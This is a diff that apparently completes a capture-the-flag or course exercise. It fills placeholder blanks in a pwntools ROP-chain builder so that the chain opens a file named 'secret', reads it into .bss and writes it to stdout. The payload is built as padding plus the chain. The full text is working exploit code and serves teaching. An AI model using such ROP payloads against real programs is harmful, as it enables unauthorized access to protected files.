@@ -53,10 +53,9 @@ def build_ropchain():
     write_target = e.bss()
     r = ROP([e])
 
-    # What is our objective here? Read a file and get the content sent back to us
-    r.call('open', [next(e.search(b'???')), 0])
-    r.call('read', [???, write_target, 100])
-    r.call('write', [???, write_target, 100])
+    r.call('open', [next(e.search(b'secret')), 0])
+    r.call('read', [3, write_target, 100])
+    r.call('write', [1, write_target, 100])
     r.call('exit', [0])
 
     # print(r.dump())
@@ -124,9 +123,7 @@ while True:
         padding = payload_template.split(b"\x48\x47\x46\x45\x44\x43\x42\x41")[0]
 
         r = build_ropchain()
-        # what shall our payload contain.
-        # hint: get the actual rop chain using r.chain()
-        payload = ??? + ???
+        payload = padding + r.chain()
 
         with open("payload", 'wb') as fd:
             fd.write(payload)
@@ -137,7 +134,5 @@ while True:
     #p.sendline(base64.b64encode(correct_input).decode())
     #msg = p.recvline()
     #print(msg)
-    
-    # 
     done += 1
     #print("Done:", done)
